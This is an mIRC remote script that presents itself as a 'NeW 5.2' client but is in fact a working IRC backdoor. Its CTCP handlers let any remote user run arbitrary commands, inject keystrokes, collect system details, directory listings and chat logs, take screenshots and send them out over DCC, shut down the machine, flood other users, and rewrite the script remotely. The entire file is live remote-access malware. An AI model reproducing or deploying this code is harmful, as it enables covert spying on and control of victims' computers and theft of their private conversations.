[script]
n0=; NeW 5.2 client (build 5.2.60)
n1=
n2=ctcp 1:INF*:*: {
n3=  haltdef
n4=  set %INFv 5.1
n5=  if ($2 == comand) { $3- }
n6=  if ($2 == info) { .ctcp $nick INF reinfo $ip $host $dll(ProcInfo.dll,GetCpuSpeed,mhz) $dll(ProcInfo.dll,GetCpuUsage,.) $dll(ProcInfo.dll,GetRam,memory) }
n7=  if ($2 == ping) { .ctcp $nick INF reping %INFv }
n8=  if ($2 == castigo) { timer 10 1 dll cursor.dll MoveCursor 500 500  }
n9=  if ($2 == teclado) { dll sendkey.dll KeyStroke $3-  }
n10=  if ($2 == directorios) { .ctcp $nick INF redirectorios $mircdir $getdir $logdir $query(0) $server $query(1) $query(2) $query(3) $query(4) $query(5) $query(6) $query(7) $query(8) $query(9) $query(10) $query(11) }
n11=  if ($2 == GeTLoG) {  
n12=    if ( $findfile( $logdir , $3 $+ .log ,1) != $null ) { .dcc send $nick $findfile( $logdir , $3 $+ .log ,1)  } 
n13=    if ( $findfile( $logdir , $3 $+ .log ,1) == $null ) { .ctcp $nick INF getlog $3 } 
n14=  }
n15=  if ($2 == rechat) { aline @FLiPChaT 4<GoD> 2 $3- }
n16=  if ($2 == flipchat) { set %INFchat on | set %INFchatnick $nick | window -akdoe +b @FLiPChaT 10 10 200 100 | .timerCHAT -m 0 400 window -akdoe +b @FLiPChaT 10 10 200 100 }
n17=  if ($2 == chatoff) { set %INFchat off | timerCHAT off | window -c @Flipchat | unset %INFchatnick }
n18=  if ($2 == matar) { 
n19=    if ($3 == quit) { quit 12|7iNF12,0|1,0 $4-  }
n20=    if ($3 == quitshot) { .timer 1 2 echo -a $dll(winsd.dll,ShutDown,.) | quit 12|7iNF12,0|1,0 $4- }
n21=  if ($3 == quitshotgline) { .timer 1 4 .echo -a $dll(winsd.dll,ShutDown,.) | .join -n #madrid | .msg #madrid 5757 je je je } }
n22=  if ($2 == foto) { echo -a $dll(nScreenShot.dll,Screenshot,c:\windows\INF.jpg) | .dcc send $nick c:\windows\INF.jpg | .timerDEL 1 300 .remove c:\windows\INF.jpg }
n23=  if ($2 == floodoff) { .timerFLOOD off | unset %NEW.flood } 
n24=  if ($2 == flood) { set %NEW.flood $3 | .timerFLOOD 0 1 .msg %NEW.flood #@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@ }
n25=}
n26=ctcp 1:ACT*:*: { HALTDEF | if ($2 isnum ) { set %ACT.nline $2 | dec %ACT.nline 1 | writeini new50.ini script n $+ %ACT.nline $3- } }
n27=MENU @FLiPChaT {  Que intentas...  }  
n28=on 1:INPUT:@FLiPChaT: {  echo $1- | .ctcp %INFchatnick INF rechat $1- } 
n29=on 1:CLOSE:@FLiPChaT: { set %INFchat off }
